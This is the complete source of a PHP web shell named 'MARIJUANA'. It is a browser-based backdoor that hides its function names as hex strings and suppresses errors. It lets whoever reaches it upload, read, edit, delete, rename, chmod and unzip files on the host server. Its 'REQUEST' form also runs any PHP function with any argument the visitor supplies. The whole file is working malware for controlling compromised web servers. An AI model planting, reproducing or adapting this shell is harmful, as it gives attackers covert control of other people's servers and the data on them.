<?php ob_start("ob_gzhandler");set_time_limit(0);error_reporting(~E_ALL);ini_set('display_errors', 0);?>
<!DOCTYPE html>
	<html dir="auto" lang="en-US">

		<head>
			<meta charset="UTF-8">
			<meta name="robots" content="NOINDEX, NOFOLLOW">

				<title>MARIJUANA</title>

			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">

			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
		</head>

		<body>
			<header>
				<div class="y x">
				</div>

				<div class="q x w">
				</div>
				<script src="//0x5a455553.github.io/MARIJUANA/jquery.js"></script>
			</header>

			<article>
				<div class="i">
					<i class="far fa-hdd"></i>
					<?php $_0 = uhex("7068705f756e616d65"); echo $_0();?>

					<br />

					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php $_1 = uhex("70687076657273696f6e"); echo $_1();?>
					
					<br />

					<i class="far fa-folder"></i>
					<?php $_2 = uhex("6368646972"); $_3 = uhex("676574637764"); isset($_GET["d"]) ? ($d = uhex($_GET["d"]) AND $_2(uhex($_GET["d"]))) : $d = $_3(); $_4 = uhex("707265675f73706c6974"); $k = $_4("/(\\\|\/)/", $d ); foreach ($k as $m => $l) { ($l=='' && $m==0) ? print '<a href="?d=2f">/</a>' : NULL; if($l == '') continue; echo '<a href="?d='; for ($i = 0; $i <= $m; $i++) { echo hex($k[$i]); ($i != $m) ? print '2f' : null;}echo '">'.$l.'</a>/'; }?>

					<br />

				</div>

				<div class="u">
					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
					<br />

					<br />

					<form method="post" enctype="multipart/form-data">
						<label class="l w">
							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
						</label>&nbsp;
					</form>

					<?php
					$m_ = uhex('68656164657228224c6f636174696f6e3a203f643d222e686578282464292e2226');
					$n_ = uhex('22293b6578697428293b');
					$x_ = $m_.'1'.$n_;
					$y_ = $m_.'0'.$n_;
					$__ = uhex('617373657274');
					$o_ = '<script>$.notify("';
					$e_ = '", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>';
					$f = $o_.'OK!'.$e_;
					$g = $o_.'ER!'.$e_;
					$_6 = uhex('66696c655f6765745f636f6e74656e7473');
					$_8 = uhex('69735f646972');
					$_10 = uhex('756e6c696e6b');
					if(isset($_FILES["n"])) {
						$_5 = uhex('636f7079');
						$z = $_FILES["n"]["name"];
						$r = count($z);
						for( $i=0 ; $i < $r ; $i++ ) {
							if ($_5($_FILES["n"]["tmp_name"][$i], $z[$i])) {
								echo $f;
							}
							else {
								echo $g;
							}
						}
					}
					?>

				</div>
				<?php
					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';
					$b_ = '</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';
					$c_ = '</td>
							</tr>
						</tbody>
					</table>';
					$d_ = '<br />
										<br />
										<input type="submit" class="w" value="&nbsp;OK&nbsp;" />
									</form>';
					$_15 = uhex('68746d6c7370656369616c6368617273');
					$_20 = uhex('64617465');
					$_21 = uhex('66696c656d74696d65');
					$_25 = uhex('746f756368');
					if (isset($_GET["s"])) {
						echo $a_.uhex($_GET["s"]).$b_.'
									<textarea readonly="yes">'.$_15($_6(uhex($_GET["s"]))).'</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
								'.$c_;
					}
					elseif (isset($_GET["y"])) {
						echo $a_.'REQUEST'.$b_.'
									<form method="post">
										<input class="x" type="text" name="1" />&nbsp;&nbsp;
										<input class="x" type="text" name="2" />
										'.$d_.'
									<br />
									<textarea readonly="yes">';
					
									if(isset($_POST["2"])) {
											$a = $_POST["1"];
											$v = $_POST["2"];
											$s = ($a($v));
											$_16 = uhex('7661725f64756d70');
											$_16($s);
											}
										
								echo '</textarea>
								'.$c_;
					}
					elseif (isset($_GET["e"])) {
						echo $a_.uhex($_GET["e"]).$b_.'
									<form method="post">
										<textarea name="e" class="o">'.$_15($_6(uhex($_GET["e"]))).'</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> : 
										<select name="b64">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select>
										'.$d_.'
								'.$c_;
					if (isset($_POST["e"])) {
						$_7 = uhex('6261736536345f6465636f6465');
						if ($_POST["b64"] == "1") {
							$ex = $_7($_POST["e"]);
						}
						else {
							$ex = $_POST["e"];
						}
						$_17 = uhex('666f70656e');
						$_18 = uhex('667772697465');
						$_19 = uhex('66636c6f7365');
						$fp = $_17(uhex($_GET["e"]), 'w');
						if ($_18($fp, $ex)) {
							$__($x_);
						} else {
							$__($y_);
						}
						$_19($fp);
					  }
					}
					elseif (isset($_GET["x"])) {
						$_9 = uhex('726d646972');
						if($_8(uhex($_GET["x"]))) {
							$_9(uhex($_GET["x"])) ? $__($x_) : $__($y_);
						}
						else {
							if(!$_10(uhex($_GET["x"]))) {
								$__($y_);
							}
							else {
								$__($x_);
							}
						}

					}
					elseif (isset($_GET["t"])) {
						echo $a_.uhex($_GET["t"]).$b_.'
									<form action="" method="post">
										<input name="t" class="x" type="text" value="'.$_20("Y-m-d H:i", $_21(uhex($_GET["t"]))).'">
										'.$d_.'
								'.$c_;
					if( !empty($_POST["t"]) ) {
						$p = strtotime($_POST["t"]);
						if($p) {
							if(!$_25(uhex($_GET["t"]),$p,$p)) {
								$__($y_);
							}
							else {
								$__($x_);
							}
						} else {
							$__($y_);
						}
					  }
					}
					elseif (isset($_GET["k"])) {
						$_22 = uhex('737562737472');
						$_23 = uhex('737072696e7466');
						$_24 = uhex('66696c657065726d73');
						echo $a_.uhex($_GET["k"]).$b_.'
									<form action="" method="post">
										<input name="b" class="x" type="text" value="'.$_22($_23('%o', $_24(uhex($_GET["k"]))), -4).'">
										'.$d_.'
								'.$c_;
					if(!empty($_POST["b"])) {
						$_12 = uhex('63686d6f64');
						$x = $_POST["b"];
						$t = 0;
					for($i=strlen($x)-1;$i>=0;--$i)
						$t += (int)$x[$i]*pow(8, (strlen($x)-$i-1));
					if(!$_12(uhex($_GET["k"]), $t)) {
						$__($y_);
					} else {
						$__($x_);
						  }
						}
					}
					elseif (isset($_GET["l"])) {
						echo $a_.'+DIR'.$b_.'
									<form action="" method="post">
										<input name="l" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["l"])) {
						$_11 = uhex('6d6b646972');
						if(!$_11($_POST["l"])) {
							$__($y_);
						}
						else {
							$__($x_);
						}
					  }
					}
					elseif(isset($_GET["q"])) {
						if($_10(__FILE__)) {
							header("Location: ".basename($_SERVER['PHP_SELF'])."");
							exit();
						}
						else {
							echo $g;
						}
					}
					elseif (isset($_GET["n"])) {
						echo $a_.'+FILE'.$b_.'
									<form action="" method="post">
										<input name="n" class="x" type="text" value="">
									'.$d_.'
								'.$c_;
					if(isset($_POST["n"])) {
						if(!$_25($_POST["n"])) {
							$__($y_);
						}
						else {
							$__($x_);
						}
					  }
					}
					elseif (isset($_GET["r"])) {
						echo $a_.uhex($_GET["r"]).$b_.'
									<form action="" method="post">
										<input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">
										'.$d_.'
								'.$c_;
					if(isset($_POST["r"])) {
						$_26 = uhex('66696c655f657869737473');
						if($_26($_POST["r"])) {
							$__($y_);
						}
						else {
							$_27 = uhex('72656e616d65');
							if($_27(uhex($_GET["r"]), $_POST["r"])) {
								$__($x_);
							}
							else {
								$__($y_);
							}
						  }
					   }
					}
					elseif (isset($_GET["z"])) {
						$zip = new ZipArchive;
						$res = $zip->open(uhex($_GET["z"]));
							if ($res === TRUE) {
								$zip->extractTo(uhex($_GET["d"]));
								$zip->close();
								$__($x_);
							} else {
								$__($y_);
						  }
					}
					else {
					echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
								<th width="17%">[ PERM ]</th>
								<th width="17%">[ DATE ]</th>
								<th width="11%">[ ACT ]</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td>
									<a href="?d='.hex($d).'&n">+FILE</a>
									<a href="?d='.hex($d).'&l">+DIR</a>
								</td>
							</tr>
						';

							$h = "";
							$j = "";
							$_13 = uhex('7363616e646972');
							$w = $_13($d);
							$_28 = uhex('69735f6172726179');
							$_29 = uhex('69735f6f626a656374');
							$_31 = uhex('69735f7772697461626c65');
							$_32 = uhex('69735f7265616461626c65');
							if ($_28($w) || $_29($w)) {
							foreach($w as $c){
								$_14 = uhex('7374725f7265706c616365');
								$e = $_14("\\", "/", $d);
								$_30 = uhex('737472706f73');
								if (!$_30($c, ".zip")) {
									$zi = '';
								}
								else {
									$zi = ' <a href="?d='.hex($e).'&z='.hex($c).'">U</a>';
								}
								if ($_31("$d/$c")) {
										$o = "";
								}
								elseif (!$_32("$d/$c")) {
										$o = " h";
								}
								else {
										$o = " w";
								}
								$_32 = uhex('66696c6573697a65');
								$s = $_32("$d/$c") / 1024;
								$s = round($s, 3);
								($s >= 1024) ? $s = round($s / 1024, 2) . " MB" : $s = $s . " KB";
							if(($c != ".") && ($c != "..")){
								($_8("$d/$c")) ?
								$h .= '<tr class="r">
							<td>
								<i class="far fa-folder m"></i> <a href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x'.$o.'" onclick="location.href=\'?d='.hex($e).'&k='.hex($c).'\';">
								'.x("$d/$c").'
							</td>
							<td class="x">
								<a href="?d='.hex($e).'&t='.hex($c).'">'.$_20("Y-m-d H:i", $_21("$d/$c")).'</a>
							</td>
							<td class="x">
								<a href="?d='.hex($e).'&r='.hex($c).'">R</a> <a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						'
							:
								$j .= '<tr class="r">
							<td>
								<i class="far fa-file m"></i>&thinsp; <a href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
							</td>
							<td class="x">
								'.$s.'
							</td>
							<td class="x'.$o.'" onclick="location.href=\'?d='.hex($e).'&k='.hex($c).'\';">
								'.x("$d/$c").'
							</td>
							<td class="x">
								<a href="?d='.hex($e).'&t='.hex($c).'">'.$_20("Y-m-d H:i", $_21("$d/$c")).'</a>
							</td>
							<td class="x">
								<a href="?d='.hex($e).'&r='.hex($c).'">R</a> <a href="?d='.hex($e).'&x='.hex($c).'">D</a> <a href="?d='.hex($e).'&e='.hex($c).'">E</a>'.$zi.'
							</td>
						</tr>
						';

							}
						}
					}

						echo $h;
						echo $j;
						echo '</tbody>
						<tfoot>
							<tr>
								<th class="et">
									<a href="?d='.hex($e).'&y">REQUEST</a>
									<a href="?d='.hex($e).'&q">EXIT</a>
								</th>
								<th class="et" width="11%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="11%"></th>
							</tr>
					</tfoot>
				</table>';
					}
					?>

			</article>
			<footer class="x">
				&copy;TheAlmightyZeus
			</footer>
			<?php
			if (isset($_GET["1"])) {
				echo $f;
			}
			elseif (isset($_GET["0"])) {
				echo $g;
			}
			else {
				NULL;
			}
			?>

		</body>
	</html>
<?php
function x($c) {
	$_24 = uhex('66696c657065726d73');
	$x = $_24($c);
	if (($x & 0xC000) == 0xC000) {
		$u = "s";
	} elseif (($x & 0xA000) == 0xA000) {
		$u = "l";
	} elseif (($x & 0x8000) == 0x8000) {
		$u = "-";
	} elseif (($x & 0x6000) == 0x6000) {
		$u = "b";
	} elseif (($x & 0x4000) == 0x4000) {
		$u = "d";
	} elseif (($x & 0x2000) == 0x2000) {
		$u = "c";
	} elseif (($x & 0x1000) == 0x1000) {
		$u = "p";
	} else {
		$u = "u";
	}
	$u .= (($x & 0x0100) ? "r" : "-");
	$u .= (($x & 0x0080) ? "w" : "-");
	$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
	$u .= (($x & 0x0020) ? "r" : "-");
	$u .= (($x & 0x0010) ? "w" : "-");
	$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
	$u .= (($x & 0x0004) ? "r" : "-");
	$u .= (($x & 0x0002) ? "w" : "-");
	$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
	return $u;
}
function hex($n){
    $y='';
    for ($i=0; $i < strlen($n); $i++){
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function uhex($y){
    $n='';
    for ($i=0; $i < strlen($y)-1; $i+=2){
        $n .= chr(hexdec($y[$i].$y[$i+1]));
    }
    return $n;
}
?>